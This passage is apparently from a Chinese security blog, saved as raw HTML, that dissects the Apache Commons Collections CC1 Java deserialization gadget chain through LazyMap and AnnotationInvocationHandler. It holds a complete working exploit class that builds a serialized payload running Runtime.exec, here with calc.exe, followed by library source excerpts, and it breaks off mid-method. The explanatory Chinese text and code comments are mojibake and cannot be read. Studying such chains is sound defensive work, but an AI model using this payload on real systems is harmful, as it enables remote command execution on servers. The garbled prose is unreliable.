</span></span></span><span class=line><span class=cl><span class=nd>@Target</span><span class=p>({</span><span class=n>ElementType</span><span class=p>.</span><span class=na>ANNOTATION_TYPE</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=nd>@interface</span><span class=w> </span><span class=n>Target</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ElementType</span><span class=o>[]</span><span class=w> </span><span class=nf>value</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Documented</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nd>@Retention</span><span class=p>(</span><span class=n>RetentionPolicy</span><span class=p>.</span><span class=na>RUNTIME</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nd>@Target</span><span class=p>({</span><span class=n>ElementType</span><span class=p>.</span><span class=na>ANNOTATION_TYPE</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=nd>@interface</span><span class=w> </span><span class=n>Retention</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>RetentionPolicy</span><span class=w> </span><span class=nf>value</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=lazymapé“¾>LazyMapé“¾</h3><h4 id=expå±•ç¤º>Expå±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.cc</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections1L</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;calc.exe&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>transformerChain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>innerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//innerMap.put(&#34;value&#34;, &#34;hack&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>outerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>innerMap</span><span class=p>,</span><span class=w> </span><span class=n>transformerChain</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>ctor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>ith</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>ctor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>SuppressWarnings</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>outerMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>mapProxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=n>ith</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>SuppressWarnings</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>mapProxy</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;payload.bin&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>fos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>o</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FileInputStream</span><span class=w> </span><span class=n>fis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;payload.bin&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>fis</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>â€</p><h4 id=expæ„é€ åˆ†æ-1>Expæ„é€ åˆ†æ</h4><h5 id=lazymap>LazyMap</h5><p>çŸ¥é“äº†TransformerMapé“¾çš„åŸç†ï¼Œæˆ‘ä»¬å°è¯•é€†è°ƒç”¨é“¾åˆ†æä¸€ä¸‹ã€‚</p><p>æ ¹æ®TransformerMapé“¾çš„åˆ†æï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾ä¸€ä¸ªç±»ï¼Œè°ƒç”¨äº†ChainedTransformerçš„transformeræ–¹æ³•ã€‚</p><p>æŸ¥çœ‹ChainedTransformerçš„transformerçš„è°ƒç”¨å…³ç³»ï¼Œå°±å¯ä»¥çœ‹åˆ°LazyMapï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/627bea67e99c4add810b451c1ec68a40-20241004012828-voem1xh.png loading=lazy alt=627bea67e99c4add810b451c1ec68a40>â€‹</p><p>åˆ†æLazyMapæºç ï¼Œè‹¥keyä¸å­˜åœ¨ï¼Œåˆ™è°ƒç”¨Transformerçš„transformæ–¹æ³•ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>factory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>get</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// create value for key if key is not currently in the map</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>map</span><span class=p>.</span><span class=na>containsKey</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>factory</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥éœ€è¦æ‰¾é‚£é‡Œå¯ä»¥è°ƒç”¨è¿™ä¸ªgetæ–¹æ³•çš„åœ°æ–¹ã€‚</p><h5 id=annotationinvocationhandler-1>AnnotationInvocationHandler</h5><p>åœ¨TransformerMapé“¾ä¸­åˆ†æè¿‡ï¼ŒAnnotationInvocationHandlerçš„readObjectæ–¹æ³•åªæœ‰è°ƒç”¨äº†setValueæ–¹æ³•ï¼Œæ²¡æœ‰è°ƒç”¨getæ–¹æ³•ã€‚</p><p>é‚£æ˜¯å¦è¿˜æœ‰åˆ«çš„åœ°æ–¹å¯ä»¥åˆ©ç”¨å‘¢ï¼Ÿ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Annotation</span><span class=o>&gt;</span><span class=w> </span><span class=n>type</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>memberValues</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>AnnotationInvocationHandler</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Annotation</span><span class=o>&gt;</span><span class=w> </span><span class=n>var1</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>var2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>memberValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>invoke</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>var1</span><span class=p>,</span><span class=w> </span><span class=n>Method</span><span class=w> </span><span class=n>var2</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>var3</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>var4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>.</span><span class=na>getName</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>var5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>.</span><span class=na>getParameterTypes</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;equals&#34;</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>var5</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>1</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>var5</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>equalsImpl</span><span class=p>(</span><span class=n>var3</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>assert</span><span class=w> </span><span class=n>var5</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;toString&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>toStringImpl</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;hashCode&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>hashCodeImpl</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;annotationType&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Object</span><span class=w> </span><span class=n>var6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>memberValues</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>var4</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var6</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IncompleteAnnotationException</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=p>,</span><span class=w> </span><span class=n>var4</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var6</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>ExceptionProxy</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>throw</span><span class=w> </span><span class=p>((</span><span class=n>ExceptionProxy</span><span class=p>)</span><span class=n>var6</span><span class=p>).</span><span class=na>generateException</span><span class=p>();</span><span class=w>
